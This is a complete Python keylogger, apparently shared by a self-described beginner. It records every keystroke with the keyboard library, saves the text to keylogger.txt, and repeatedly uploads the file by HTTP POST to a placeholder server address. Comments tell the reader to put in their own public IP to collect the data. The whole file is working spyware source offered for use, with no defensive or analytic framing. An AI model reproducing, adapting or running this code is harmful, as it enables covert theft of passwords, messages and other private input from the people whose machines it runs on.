import keyboard
import os 
import requests

server_url = 'http://10.10.10.10:5000/upload' #Don't forget to put the public ip adresse of your http server
file_source = current_path = os.getcwd() + '\keylogger.txt'
number_of_files = 10 # It's just the number of files you want to send to your server 
COMPTEUR = 0

# the function used for sending the keylogger's file to your server 
def send_file_to_server(server_url, fichier_source):
    fichier = {'file': open(fichier_source, 'rb')}
    response = requests.post(server_url, files=fichier)

    if response.status_code == 200:
        print('file sent.')
    else:
        print(f"Error : {response.status_code}")

#Yes i know, there are too much if condition. I just want to have a pretty file 
#I did'nt have a file with just a letter per line
#Maybe you can do better. i am a noob 
while  COMPTEUR <= number_of_files:
    keys = keyboard.record(until ='ctrl+ENTER')
    chain = ''
    for key in keys: 
        if key.event_type == 'down':
            if key.name == 'enter':
                chain = chain +'\n'
            elif key.name == 'space':
                chain = chain + ' '
            elif key.name == 'verr.maj':
                chain = chain
            elif key.name == 'backspace':
                if chain[-2:] == '\n':
                    chain = chain[:len(chain)-2] 
                else:
                    chain = chain[:len(chain)-1]    
            else: 
                chain = chain + key.name
        else : 
            if key.name == 'ctrl+enter':
                break 

    
    file = open("keylogger.txt", "w") 
    file.write(chain)
    file.close()
    send_file_to_server(server_url, file_source)
    COMPTEUR+=1

#You can also change the filename for each sending to not delete the old keylogger.txt file

# @copyright-Mrvaro-2023









